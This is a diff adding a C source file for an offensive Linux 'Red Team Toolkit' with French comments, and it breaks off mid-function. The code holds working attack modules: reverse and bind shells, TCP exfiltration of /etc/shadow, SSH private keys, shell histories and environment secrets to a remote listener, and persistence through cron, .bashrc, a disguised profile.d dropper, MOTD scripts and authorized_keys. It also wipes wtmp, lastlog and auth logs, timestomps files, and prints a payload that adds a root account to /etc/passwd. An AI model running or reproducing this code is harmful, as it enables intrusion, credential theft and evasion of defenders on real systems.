@@ -1,0 +1,1367 @@
+/*
+ * ============================================================
+ *   RED TEAM TOOLKIT - v1.0
+ *   Usage: ./rtk [module] [options]
+ *   LEGAL: Usage uniquement sur systèmes autorisés.
+ * ============================================================
+ *
+ * MODULES DISPONIBLES:
+ *   recon     - Reconnaissance (DNS, WHOIS, sous-domaines)
+ *   privesc   - Privilege Escalation checks locaux
+ *   persist   - Persistence (crontab, bashrc, motd)
+ *   shell     - Reverse/Bind shell TCP
+ *   exfil     - Exfiltration de données sensibles
+ *   evasion   - Nettoyage logs / timestamps
+ *   postex    - Post-exploitation (shadow, env, history)
+ *   brute     - Brute force basique HTTP Basic Auth
+ *   payload   - Génération de payloads (shellcode C, python)
+ *   lateral   - Préparation au mouvement latéral
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/utsname.h>
+#include <sys/mman.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <dirent.h>
+#include <fcntl.h>
+#include <time.h>
+#include <pwd.h>
+#include <grp.h>
+#include <signal.h>
+#include <ifaddrs.h>
+#include <net/if.h>
+#include <utmp.h>
+#include <lastlog.h>
+
+/* ─── Couleurs ANSI ─────────────────────────────────────── */
+#define RED     "\033[1;31m"
+#define GRN     "\033[1;32m"
+#define YEL     "\033[1;33m"
+#define BLU     "\033[1;34m"
+#define MAG     "\033[1;35m"
+#define CYN     "\033[1;36m"
+#define WHT     "\033[1;37m"
+#define RST     "\033[0m"
+#define BOLD    "\033[1m"
+
+/* ─── Macros utilitaires ────────────────────────────────── */
+#define BANNER_LINE "═══════════════════════════════════════════════════════"
+#define OK    printf(GRN "[+]" RST " ")
+#define WARN  printf(YEL "[!]" RST " ")
+#define ERR   printf(RED "[-]" RST " ")
+#define INFO  printf(BLU "[*]" RST " ")
+#define HEAD  printf(MAG "[>]" RST " ")
+
+#define MAX_LINE   4096
+#define MAX_PATH   512
+#define MAX_HOST   256
+
+/* ============================================================
+ *  SECTION 0 - BANNIÈRE & AIDE
+ * ============================================================ */
+
+static void print_banner(void) {
+    printf(RED);
+    printf(" ██████╗ ████████╗██╗  ██╗\n");
+    printf(" ██╔══██╗╚══██╔══╝██║ ██╔╝\n");
+    printf(" ██████╔╝   ██║   █████╔╝ \n");
+    printf(" ██╔══██╗   ██║   ██╔═██╗ \n");
+    printf(" ██║  ██║   ██║   ██║  ██╗\n");
+    printf(" ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝\n");
+    printf(RST);
+    printf(CYN "    Red Team Toolkit v1.0 — Linux\n" RST);
+    printf(YEL "    [!] Autorisations nécessaires avant usage\n\n" RST);
+}
+
+static void print_help(void) {
+    print_banner();
+    printf(BOLD "USAGE:\n" RST);
+    printf("  ./rtk <module> [args...]\n\n");
+    printf(BOLD "MODULES:\n" RST);
+    printf("  " CYN "recon"    RST "  <cible>            Résolution DNS, reverse DNS, WHOIS, sous-domaines\n");
+    printf("  " CYN "privesc"  RST "                     Audit local PrivEsc (SUID, sudo, cron, caps, PATH)\n");
+    printf("  " CYN "persist"  RST "  <cmd>              Installer persistance (crontab/bashrc/motd)\n");
+    printf("  " CYN "shell"    RST "   <ip> <port> <r|b> Reverse shell (r) ou Bind shell (b)\n");
+    printf("  " CYN "exfil"    RST "  <ip> <port>        Exfiltrer fichiers sensibles vers listener TCP\n");
+    printf("  " CYN "evasion"  RST "                     Nettoyer wtmp/lastlog/bash_history\n");
+    printf("  " CYN "postex"   RST "                     Dump env, shadow, crontabs, clés SSH, history\n");
+    printf("  " CYN "brute"    RST "   <url> <wordlist>  Brute force HTTP Basic Auth (GET)\n");
+    printf("  " CYN "payload"  RST "  <ip> <port> <type> Générer payload (c|py|bash|perl)\n");
+    printf("  " CYN "lateral"  RST "                     Collecte infos pour mouvement latéral\n");
+    printf("\n");
+}
+
+/* ============================================================
+ *  SECTION 1 - RECONNAISSANCE
+ * ============================================================ */
+
+static void recon_dns_forward(const char *host) {
+    struct addrinfo hints, *res, *p;
+    char ip[INET6_ADDRSTRLEN];
+
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+
+    OK; printf("Résolution directe: %s\n", host);
+
+    if (getaddrinfo(host, NULL, &hints, &res) != 0) {
+        ERR; printf("Résolution échouée: %s\n", strerror(errno));
+        return;
+    }
+    for (p = res; p; p = p->ai_next) {
+        void *addr;
+        const char *ipver;
+        if (p->ai_family == AF_INET) {
+            addr = &((struct sockaddr_in *)p->ai_addr)->sin_addr;
+            ipver = "IPv4";
+        } else {
+            addr = &((struct sockaddr_in6 *)p->ai_addr)->sin6_addr;
+            ipver = "IPv6";
+        }
+        inet_ntop(p->ai_family, addr, ip, sizeof ip);
+        OK; printf("  %s → %s\n", ipver, ip);
+    }
+    freeaddrinfo(res);
+}
+
+static void recon_dns_reverse(const char *ip_str) {
+    struct sockaddr_in sa;
+    char host[NI_MAXHOST];
+
+    sa.sin_family = AF_INET;
+    if (inet_pton(AF_INET, ip_str, &sa.sin_addr) != 1) {
+        WARN; printf("IP invalide pour reverse DNS: %s\n", ip_str);
+        return;
+    }
+    if (getnameinfo((struct sockaddr*)&sa, sizeof sa,
+                    host, sizeof host, NULL, 0, NI_NAMEREQD) == 0) {
+        OK; printf("Reverse DNS: %s → %s\n", ip_str, host);
+    } else {
+        WARN; printf("Pas de PTR pour %s\n", ip_str);
+    }
+}
+
+static void recon_subdomains(const char *domain) {
+    /* Dictionnaire de sous-domaines courants */
+    const char *subs[] = {
+        "www","mail","ftp","smtp","pop","imap","webmail","remote",
+        "vpn","admin","portal","api","dev","test","staging","beta",
+        "ns1","ns2","mx","mx1","mx2","shop","store","blog","forum",
+        "intranet","extranet","cdn","static","assets","media","img",
+        "login","auth","sso","ldap","git","gitlab","jenkins","ci",
+        "jira","confluence","wiki","backup","db","database","mysql",
+        "redis","elastic","kibana","grafana","monitor","nagios",
+        NULL
+    };
+
+    struct addrinfo hints, *res;
+    char fqdn[MAX_HOST];
+    char ip[INET6_ADDRSTRLEN];
+    int found = 0;
+
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+
+    INFO; printf("Bruteforce sous-domaines pour: %s\n\n", domain);
+
+    for (int i = 0; subs[i]; i++) {
+        snprintf(fqdn, sizeof fqdn, "%s.%s", subs[i], domain);
+        if (getaddrinfo(fqdn, NULL, &hints, &res) == 0) {
+            inet_ntop(AF_INET,
+                &((struct sockaddr_in*)res->ai_addr)->sin_addr,
+                ip, sizeof ip);
+            OK; printf("  %-35s → %s\n", fqdn, ip);
+            freeaddrinfo(res);
+            found++;
+        }
+    }
+    printf("\n");
+    INFO; printf("Sous-domaines trouvés: %d\n", found);
+}
+
+static void recon_whois_cmd(const char *target) {
+    char cmd[MAX_LINE];
+    INFO; printf("Lancement WHOIS (via système)...\n");
+    snprintf(cmd, sizeof cmd, "whois '%s' 2>/dev/null | head -40", target);
+    system(cmd);
+}
+
+static void recon_interfaces(void) {
+    struct ifaddrs *ifap, *ifa;
+    char host[NI_MAXHOST];
+
+    INFO; printf("Interfaces réseau locales:\n");
+    if (getifaddrs(&ifap) == -1) { ERR; perror("getifaddrs"); return; }
+
+    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr) continue;
+        int family = ifa->ifa_addr->sa_family;
+        if (family == AF_INET || family == AF_INET6) {
+            getnameinfo(ifa->ifa_addr,
+                (family == AF_INET) ? sizeof(struct sockaddr_in)
+                                    : sizeof(struct sockaddr_in6),
+                host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+            OK; printf("  %-12s %s  [%s]\n",
+                ifa->ifa_name, host,
+                (family == AF_INET) ? "IPv4" : "IPv6");
+        }
+    }
+    freeifaddrs(ifap);
+}
+
+static void module_recon(const char *target) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: RECONNAISSANCE — %s\n", target);
+    printf(BANNER_LINE "\n\n" RST);
+
+    recon_dns_forward(target);
+    printf("\n");
+    recon_dns_reverse(target);        /* tente si c'est une IP */
+    printf("\n");
+    recon_subdomains(target);
+    printf("\n");
+    recon_whois_cmd(target);
+    printf("\n");
+    recon_interfaces();
+}
+
+/* ============================================================
+ *  SECTION 2 - PRIVILEGE ESCALATION CHECKS
+ * ============================================================ */
+
+static void privesc_suid(void) {
+    HEAD; printf("Binaires SUID/SGID:\n");
+    system("find / -perm /6000 -type f 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'");
+}
+
+static void privesc_sudo(void) {
+    HEAD; printf("Droits sudo:\n");
+    system("sudo -l 2>/dev/null");
+}
+
+static void privesc_capabilities(void) {
+    HEAD; printf("Capabilities sur les binaires:\n");
+    system("getcap -r / 2>/dev/null");
+}
+
+static void privesc_writable_paths(void) {
+    HEAD; printf("Répertoires d'écriture dans PATH:\n");
+    char *path_env = getenv("PATH");
+    if (!path_env) return;
+    char *path_copy = strdup(path_env);
+    char *tok = strtok(path_copy, ":");
+    while (tok) {
+        if (access(tok, W_OK) == 0) {
+            WARN; printf("  Inscriptible: %s\n", tok);
+        }
+        tok = strtok(NULL, ":");
+    }
+    free(path_copy);
+}
+
+static void privesc_cron(void) {
+    HEAD; printf("Cron jobs:\n");
+    system("cat /etc/crontab 2>/dev/null");
+    system("ls -la /etc/cron* 2>/dev/null");
+    system("crontab -l 2>/dev/null");
+    /* Cherche les scripts appelés par cron et inscriptibles */
+    INFO; printf("Scripts cron inscriptibles:\n");
+    system("find /etc/cron* /var/spool/cron -type f 2>/dev/null \
+            | xargs grep -rh '^[^#].*/' 2>/dev/null \
+            | awk '{print $NF}' \
+            | sort -u \
+            | xargs -I{} sh -c 'test -w {} && echo \"[WRITABLE] {}\"' 2>/dev/null");
+}
+
+static void privesc_sensitive_files(void) {
+    HEAD; printf("Fichiers sensibles lisibles:\n");
+    const char *files[] = {
+        "/etc/shadow", "/etc/sudoers", "/root/.bash_history",
+        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
+        "/etc/passwd", "/etc/group",
+        NULL
+    };
+    for (int i = 0; files[i]; i++) {
+        if (access(files[i], R_OK) == 0) {
+            OK; printf("  Lisible: %s\n", files[i]);
+        }
+    }
+}
+
+static void privesc_envvars(void) {
+    HEAD; printf("Variables d'environnement potentiellement dangereuses:\n");
+    const char *dangerous[] = {"LD_PRELOAD","LD_LIBRARY_PATH","PYTHONPATH",
+                                "PERL5LIB","RUBYLIB","NODE_PATH", NULL};
+    for (int i = 0; dangerous[i]; i++) {
+        char *v = getenv(dangerous[i]);
+        if (v) {
+            WARN; printf("  %s=%s\n", dangerous[i], v);
+        }
+    }
+}
+
+static void privesc_docker_escape(void) {
+    HEAD; printf("Détection environnement Docker/LXC:\n");
+    if (access("/.dockerenv", F_OK) == 0) {
+        WARN; printf("  Fichier /.dockerenv présent — dans un conteneur Docker\n");
+    }
+    if (access("/proc/1/cgroup", R_OK) == 0) {
+        system("grep -q 'docker\\|lxc' /proc/1/cgroup 2>/dev/null "
+               "&& echo '[!] cgroup indique conteneur'");
+    }
+    /* Vérifie si /proc/sysrq-trigger inscriptible (escape possible) */
+    if (access("/proc/sysrq-trigger", W_OK) == 0) {
+        WARN; printf("  /proc/sysrq-trigger inscriptible — escape potentiel\n");
+    }
+}
+
+static void privesc_passwd_writable(void) {
+    HEAD; printf("Vérification /etc/passwd inscriptible:\n");
+    if (access("/etc/passwd", W_OK) == 0) {
+        WARN; printf("  /etc/passwd est inscriptible! Ajout utilisateur root possible.\n");
+        INFO; printf("  Payload: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd\n");
+    } else {
+        OK; printf("  /etc/passwd protégé en écriture.\n");
+    }
+}
+
+static void privesc_kernel_version(void) {
+    struct utsname u;
+    uname(&u);
+    HEAD; printf("Infos noyau:\n");
+    OK; printf("  OS: %s %s %s %s\n", u.sysname, u.nodename, u.release, u.machine);
+    INFO; printf("  Recherchez CVE pour: %s %s\n", u.sysname, u.release);
+    /* Noyaux vulnérables connus (liste non exhaustive) */
+    const char *vulns[] = {
+        "3.14","3.19","4.4","4.8","4.14","4.15","5.8","5.11","5.13",NULL
+    };
+    for (int i = 0; vulns[i]; i++) {
+        if (strncmp(u.release, vulns[i], strlen(vulns[i])) == 0) {
+            WARN; printf("  Kernel %s potentiellement vulnérable (dirtycow/etc.)\n",
+                         u.release);
+        }
+    }
+}
+
+static void module_privesc(void) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: PRIVILEGE ESCALATION\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    privesc_kernel_version();   printf("\n");
+    privesc_suid();             printf("\n");
+    privesc_sudo();             printf("\n");
+    privesc_capabilities();     printf("\n");
+    privesc_cron();             printf("\n");
+    privesc_writable_paths();   printf("\n");
+    privesc_sensitive_files();  printf("\n");
+    privesc_envvars();          printf("\n");
+    privesc_passwd_writable();  printf("\n");
+    privesc_docker_escape();    printf("\n");
+}
+
+/* ============================================================
+ *  SECTION 3 - PERSISTENCE
+ * ============================================================ */
+
+static void persist_crontab(const char *cmd) {
+    HEAD; printf("Installation crontab (toutes les minutes)...\n");
+    char buf[MAX_LINE];
+    snprintf(buf, sizeof buf,
+        "(crontab -l 2>/dev/null; echo '* * * * * %s') | crontab -", cmd);
+    if (system(buf) == 0) {
+        OK; printf("Crontab installée: %s\n", cmd);
+    } else {
+        ERR; printf("Échec installation crontab\n");
+    }
+}
+
+static void persist_bashrc(const char *cmd) {
+    HEAD; printf("Injection dans ~/.bashrc...\n");
+    char path[MAX_PATH];
+    snprintf(path, sizeof path, "%s/.bashrc", getenv("HOME") ?: "/root");
+    FILE *f = fopen(path, "a");
+    if (f) {
+        fprintf(f, "\n# system-update\n%s &>/dev/null &\n", cmd);
+        fclose(f);
+        OK; printf("Payload injecté dans %s\n", path);
+    } else {
+        ERR; printf("Impossible d'ouvrir %s\n", path);
+    }
+}
+
+static void persist_profile(const char *cmd) {
+    HEAD; printf("Injection dans /etc/profile.d/...\n");
+    const char *dropper = "/etc/profile.d/.sys_update.sh";
+    FILE *f = fopen(dropper, "w");
+    if (f) {
+        fprintf(f, "#!/bin/sh\n%s &>/dev/null &\n", cmd);
+        fclose(f);
+        chmod(dropper, 0755);
+        OK; printf("Script installé: %s\n", dropper);
+    } else {
+        WARN; printf("Pas de droits sur /etc/profile.d/\n");
+    }
+}
+
+static void persist_motd(const char *cmd) {
+    HEAD; printf("Injection dans /etc/update-motd.d/...\n");
+    const char *path = "/etc/update-motd.d/99-payload";
+    FILE *f = fopen(path, "w");
+    if (f) {
+        fprintf(f, "#!/bin/sh\n%s &>/dev/null &\n", cmd);
+        fclose(f);
+        chmod(path, 0755);
+        OK; printf("Payload dans MOTD: %s\n", path);
+    } else {
+        WARN; printf("Pas de droits sur /etc/update-motd.d/\n");
+    }
+}
+
+static void persist_ssh_key(void) {
+    HEAD; printf("Tentative ajout clé SSH dans authorized_keys...\n");
+    /* Génère une clé publique fictive pour démo */
+    const char *fake_pubkey =
+        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC_REDTEAM_KEY_PLACEHOLDER "
+        "rtk@persistence";
+    char path[MAX_PATH];
+    char sshdirpath[MAX_PATH];
+    snprintf(sshdirpath, sizeof sshdirpath, "%s/.ssh", getenv("HOME") ?: "/root");
+    snprintf(path, sizeof path, "%s/.ssh/authorized_keys", getenv("HOME") ?: "/root");
+
+    mkdir(sshdirpath, 0700);
+    FILE *f = fopen(path, "a");
+    if (f) {
+        fprintf(f, "\n%s\n", fake_pubkey);
+        fclose(f);
+        chmod(path, 0600);
+        OK; printf("Clé ajoutée dans %s\n", path);
+        INFO; printf("Remplacez la clé fictive par votre vraie clé publique.\n");
+    } else {
+        ERR; printf("Impossible d'écrire dans %s\n", path);
+    }
+}
+
+static void module_persist(const char *cmd) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: PERSISTANCE\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    INFO; printf("Commande de persistance: %s\n\n", cmd);
+    persist_crontab(cmd);   printf("\n");
+    persist_bashrc(cmd);    printf("\n");
+    persist_profile(cmd);   printf("\n");
+    persist_motd(cmd);      printf("\n");
+    persist_ssh_key();
+}
+
+/* ============================================================
+ *  SECTION 4 - SHELL (REVERSE / BIND)
+ * ============================================================ */
+
+static void shell_reverse(const char *ip, int port) {
+    int sock;
+    struct sockaddr_in sa;
+
+    INFO; printf("Connexion reverse shell → %s:%d\n", ip, port);
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) { ERR; perror("socket"); return; }
+
+    sa.sin_family      = AF_INET;
+    sa.sin_port        = htons(port);
+    sa.sin_addr.s_addr = inet_addr(ip);
+
+    if (connect(sock, (struct sockaddr*)&sa, sizeof sa) < 0) {
+        ERR; printf("Connexion échouée vers %s:%d — %s\n",
+                    ip, port, strerror(errno));
+        close(sock);
+        return;
+    }
+    OK; printf("Connecté! Lancement /bin/bash...\n");
+
+    dup2(sock, STDIN_FILENO);
+    dup2(sock, STDOUT_FILENO);
+    dup2(sock, STDERR_FILENO);
+    execl("/bin/bash", "bash", "-i", NULL);
+    /* fallback */
+    execl("/bin/sh", "sh", "-i", NULL);
+    perror("exec");
+    close(sock);
+}
+
+static void shell_bind(int port) {
+    int srv, cli;
+    struct sockaddr_in sa;
+    int opt = 1;
+
+    INFO; printf("Bind shell en écoute sur 0.0.0.0:%d\n", port);
+
+    srv = socket(AF_INET, SOCK_STREAM, 0);
+    if (srv < 0) { ERR; perror("socket"); return; }
+
+    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt);
+
+    sa.sin_family      = AF_INET;
+    sa.sin_addr.s_addr = INADDR_ANY;
+    sa.sin_port        = htons(port);
+
+    if (bind(srv, (struct sockaddr*)&sa, sizeof sa) < 0) {
+        ERR; perror("bind"); close(srv); return;
+    }
+    listen(srv, 1);
+    OK; printf("En attente de connexion...\n");
+
+    socklen_t clen = sizeof sa;
+    cli = accept(srv, (struct sockaddr*)&sa, &clen);
+    if (cli < 0) { ERR; perror("accept"); close(srv); return; }
+
+    OK; printf("Connexion acceptée depuis %s\n", inet_ntoa(sa.sin_addr));
+
+    dup2(cli, STDIN_FILENO);
+    dup2(cli, STDOUT_FILENO);
+    dup2(cli, STDERR_FILENO);
+    execl("/bin/bash", "bash", "-i", NULL);
+    execl("/bin/sh", "sh", "-i", NULL);
+    perror("exec");
+    close(cli);
+    close(srv);
+}
+
+static void module_shell(const char *ip, int port, char mode) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: SHELL — %s\n", mode == 'r' ? "REVERSE" : "BIND");
+    printf(BANNER_LINE "\n\n" RST);
+
+    if (mode == 'r') {
+        shell_reverse(ip, port);
+    } else {
+        shell_bind(port);
+    }
+}
+
+/* ============================================================
+ *  SECTION 5 - EXFILTRATION
+ * ============================================================ */
+
+static int exfil_send_file(int sock, const char *filepath) {
+    FILE *f = fopen(filepath, "r");
+    if (!f) return -1;
+
+    char header[MAX_LINE];
+    snprintf(header, sizeof header, "\n=== FICHIER: %s ===\n", filepath);
+    send(sock, header, strlen(header), 0);
+
+    char buf[4096];
+    size_t n;
+    while ((n = fread(buf, 1, sizeof buf, f)) > 0) {
+        send(sock, buf, n, 0);
+    }
+    fclose(f);
+    return 0;
+}
+
+static void module_exfil(const char *ip, int port) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: EXFILTRATION → %s:%d\n", ip, port);
+    printf(BANNER_LINE "\n\n" RST);
+
+    /* Cibles d'exfiltration */
+    const char *targets[] = {
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts",
+        "/etc/ssh/sshd_config",
+        "/root/.bash_history",
+        "/root/.ssh/id_rsa",
+        "/root/.ssh/id_ecdsa",
+        "/root/.ssh/known_hosts",
+        "/home/*/.bash_history",
+        "/proc/version",
+        "/proc/cmdline",
+        NULL
+    };
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) { ERR; perror("socket"); return; }
+
+    struct sockaddr_in sa;
+    sa.sin_family      = AF_INET;
+    sa.sin_port        = htons(port);
+    sa.sin_addr.s_addr = inet_addr(ip);
+
+    if (connect(sock, (struct sockaddr*)&sa, sizeof sa) < 0) {
+        ERR; printf("Connexion exfil échouée: %s\n", strerror(errno));
+        close(sock);
+        return;
+    }
+    OK; printf("Connexion établie. Envoi des fichiers...\n");
+
+    const char *hello = "=== RED TEAM TOOLKIT — EXFIL START ===\n";
+    send(sock, hello, strlen(hello), 0);
+
+    for (int i = 0; targets[i]; i++) {
+        /* Gestion des wildcards simples via glob du shell */
+        if (strchr(targets[i], '*')) {
+            char cmd[MAX_LINE];
+            snprintf(cmd, sizeof cmd, "ls %s 2>/dev/null", targets[i]);
+            FILE *fp = popen(cmd, "r");
+            if (fp) {
+                char line[MAX_PATH];
+                while (fgets(line, sizeof line, fp)) {
+                    line[strcspn(line, "\n")] = 0;
+                    if (exfil_send_file(sock, line) == 0) {
+                        OK; printf("  Envoyé: %s\n", line);
+                    }
+                }
+                pclose(fp);
+            }
+        } else {
+            if (exfil_send_file(sock, targets[i]) == 0) {
+                OK; printf("  Envoyé: %s\n", targets[i]);
+            } else {
+                WARN; printf("  Non lisible: %s\n", targets[i]);
+            }
+        }
+    }
+
+    /* Exfil variables d'environnement */
+    const char *env_banner = "\n=== VARIABLES ENVIRONNEMENT ===\n";
+    send(sock, env_banner, strlen(env_banner), 0);
+    extern char **environ;
+    for (char **e = environ; *e; e++) {
+        send(sock, *e, strlen(*e), 0);
+        send(sock, "\n", 1, 0);
+    }
+
+    const char *done = "\n=== RED TEAM TOOLKIT — EXFIL END ===\n";
+    send(sock, done, strlen(done), 0);
+
+    OK; printf("Exfiltration terminée.\n");
+    close(sock);
+}
+
+/* ============================================================
+ *  SECTION 6 - EVASION / LOG CLEANING
+ * ============================================================ */
+
+static void evasion_clear_utmp(void) {
+    HEAD; printf("Nettoyage wtmp (/var/log/wtmp)...\n");
+    /* Réécriture sans notre IP */
+    struct utmp ut;
+    char tmppath[] = "/tmp/.wtmp_tmp";
+    FILE *src = fopen("/var/log/wtmp", "r");
+    FILE *dst = fopen(tmppath, "w");
+
+    if (!src || !dst) {
+        WARN; printf("Accès wtmp refusé (besoin root)\n");
+        if (src) fclose(src);
+        if (dst) fclose(dst);
+        return;
+    }
+    int removed = 0;
+    while (fread(&ut, sizeof ut, 1, src) == 1) {
+        /* On supprime les entrées de type LOGIN_PROCESS et USER_PROCESS
+           correspondant à notre session (simplification: tout supprimer) */
+        if (ut.ut_type == USER_PROCESS || ut.ut_type == LOGIN_PROCESS) {
+            removed++;
+            continue;
+        }
+        fwrite(&ut, sizeof ut, 1, dst);
+    }
+    fclose(src); fclose(dst);
+    rename(tmppath, "/var/log/wtmp");
+    OK; printf("  Supprimé %d entrées de session dans wtmp\n", removed);
+}
+
+static void evasion_clear_lastlog(void) {
+    HEAD; printf("Nettoyage lastlog...\n");
+    uid_t uid = getuid();
+    int fd = open("/var/log/lastlog", O_WRONLY);
+    if (fd < 0) {
+        WARN; printf("Accès lastlog refusé (besoin root)\n");
+        return;
+    }
+    struct lastlog ll;
+    memset(&ll, 0, sizeof ll);
+    off_t off = (off_t)uid * sizeof ll;
+    if (lseek(fd, off, SEEK_SET) >= 0) {
+        write(fd, &ll, sizeof ll);
+        OK; printf("  Entrée lastlog effacée pour UID %d\n", uid);
+    }
+    close(fd);
+}
+
+static void evasion_clear_bash_history(void) {
+    HEAD; printf("Nettoyage bash_history...\n");
+    char path[MAX_PATH];
+    snprintf(path, sizeof path, "%s/.bash_history", getenv("HOME") ?: "/root");
+
+    /* Vider le fichier */
+    FILE *f = fopen(path, "w");
+    if (f) { fclose(f); OK; printf("  %s vidé\n", path); }
+    else    { WARN; printf("  Impossible de vider %s\n", path); }
+
+    /* Désactiver l'historique pour la session courante */
+    unsetenv("HISTFILE");
+    putenv("HISTSIZE=0");
+    putenv("HISTFILESIZE=0");
+    OK; printf("  Variables HIST* désactivées pour cette session\n");
+}
+
+static void evasion_clear_auth_log(void) {
+    HEAD; printf("Tentative nettoyage /var/log/auth.log...\n");
+    const char *logfiles[] = {
+        "/var/log/auth.log",
+        "/var/log/syslog",
+        "/var/log/messages",
+        "/var/log/secure",
+        NULL
+    };
+    for (int i = 0; logfiles[i]; i++) {
+        /* On supprime les lignes contenant notre IP/username */
+        char cmd[MAX_LINE];
+        snprintf(cmd, sizeof cmd,
+            "grep -vi 'rtk\\|redteam' %s > /tmp/.log_tmp "
+            "&& mv /tmp/.log_tmp %s 2>/dev/null",
+            logfiles[i], logfiles[i]);
+        if (system(cmd) == 0) {
+            OK; printf("  Nettoyé: %s\n", logfiles[i]);
+        } else {
+            WARN; printf("  Accès refusé: %s\n", logfiles[i]);
+        }
+    }
+}
+
+static void evasion_timestomp(const char *filepath) {
+    HEAD; printf("Modification timestamps sur: %s\n", filepath);
+    /* Met timestamps en 2020-01-01 00:00:00 */
+    struct timespec ts[2];
+    ts[0].tv_sec  = 1577836800; /* 2020-01-01 */
+    ts[0].tv_nsec = 0;
+    ts[1]         = ts[0];
+    if (utimensat(AT_FDCWD, filepath, ts, 0) == 0) {
+        OK; printf("  Timestamps modifiés sur %s\n", filepath);
+    } else {
+        ERR; printf("  Échec timestomp sur %s: %s\n", filepath, strerror(errno));
+    }
+}
+
+static void module_evasion(void) {
+    printf(MAG "\n" BANNER_LINE "\n");
+    printf("  MODULE: EVASION & LOG CLEANING\n");
+    printf(BANNER_LINE "\n\n" RST);
+
+    evasion_clear_bash_history();  printf("\n");
+    evasion_clear_utmp();          printf("\n");
+    evasion_clear_lastlog();       printf("\n");
+    evasion_clear_auth_log();      printf("\n");
+
+    /* Timestomp sur les binaires éventuellement déposés */
+    INFO; printf("Timestomp sur les binaires courants déposés:\n");
+    char self[MAX_PATH];
+    ssize_t n = readlink("/proc/self/exe", self, sizeof self - 1);
+    if (n > 0) {
+        self[n] = '\0';
+        evasion_timestomp(self);
+    }
+}
+
+/* ============================================================
+ *  SECTION 7 - POST-EXPLOITATION
+ * ============================================================ */
+
+static void postex_system_info(void) {
+    struct utsname u;
+    uname(&u);
+    HEAD; printf("Informations système:\n");
+    OK; printf("  Hostname: %s\n", u.nodename);
+    OK; printf("  Kernel:   %s %s\n", u.sysname, u.release);
+    OK; printf("  Arch:     %s\n", u.machine);
+    OK; printf("  UID:      %d  (EUID: %d)\n", getuid(), geteuid());
+    OK; printf("  GID:      %d  (EGID: %d)\n", getgid(), getegid());
+
+    struct passwd *pw = getpwuid(getuid());
+    if (pw) {
+        OK; printf("  Utilisateur: %s\n", pw->pw_name);
+        OK; printf("  Home: %s\n", pw->pw_dir);
+        OK; printf("  Shell: %s\n", pw->pw_shell);
+    }
+    OK; printf("  PID: %d\n", getpid());
+}
+
+static void postex_dump_passwd(void) {
+    HEAD; printf("Contenu /etc/passwd:\n");
+    FILE *f = fopen("/etc/passwd", "r");
+    if (!f) { ERR; printf("Accès refusé\n"); return; }
+    char line[MAX_LINE];
+    while (fgets(line, sizeof line, f)) {
+        /* Highlight comptes avec shell */
+        if (strstr(line, "/bash") || strstr(line, "/sh")) {
+            printf(YEL "  %s" RST, line);
+        } else {
+            printf("  %s", line);
+        }
+    }
+    fclose(f);
+}
+
+static void postex_dump_shadow(void) {
+    HEAD; printf("Tentative lecture /etc/shadow (besoin root):\n");
+    FILE *f = fopen("/etc/shadow", "r");
+    if (!f) { WARN; printf("Non accessible (UID %d)\n", getuid()); return; }
+    char line[MAX_LINE];
+    while (fgets(line, sizeof line, f)) {
+        /* Afficher uniquement les comptes avec hash */
+        if (line[0] != '#' && strchr(line, ':') &&
+            !strstr(line, ":*:") && !strstr(line, ":!:")) {
+            printf(RED "  %s" RST, line);
+        }
+    }
+    fclose(f);
+}
+
+static void postex_ssh_keys(void) {
+    HEAD; printf("Recherche clés SSH privées:\n");
+    system("find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' "
+           "-o -name 'id_dsa' 2>/dev/null | head -20");
+    system("find / -name '*.pem' -o -name '*.key' 2>/dev/null "
+           "| grep -v '/sys/' | grep -v '/proc/' | head -20");
+}
+
+static void postex_env(void) {
+    HEAD; printf("Variables d'environnement:\n");
+    extern char **environ;
+    for (char **e = environ; *e; e++) {
+        /* Highlight sensibles */
+        if (strstr(*e, "PASS") || strstr(*e, "SECRET") ||
+            strstr(*e, "TOKEN") || strstr(*e, "KEY") ||
+            strstr(*e, "AWS")   || strstr(*e, "DB_")) {
+            printf(RED "  %s\n" RST, *e);
+        } else {
+            printf("  %s\n", *e);
+        }
+    }
+}
+
+static void postex_history(void) {
+    HEAD; printf("Historiques shell:\n");
+    const char *hfiles[] = {
+        "/root/.bash_history",
+        "/root/.zsh_history",
+        "/root/.sh_history",
+        NULL
+    };
+    char home_hist[MAX_PATH];
+    snprintf(home_hist, sizeof home_hist,
+             "%s/.bash_history", getenv("HOME") ?: "");
+
+    for (int i = 0; hfiles[i]; i++) {
+        FILE *f = fopen(hfiles[i], "r");
+        if (!f) continue;
+        printf(CYN "  [%s]\n" RST, hfiles[i]);
+        char line[MAX_LINE];
+        int count = 0;
+        while (fgets(line, sizeof line, f) && count < 50) {
+            printf("    %s", line);
+            count++;
+        }
+        fclose(f);
+    }
+}
+
+static void postex_network_connections(void) {
+    HEAD; printf("Connexions réseau actives (via /proc/net):\n");
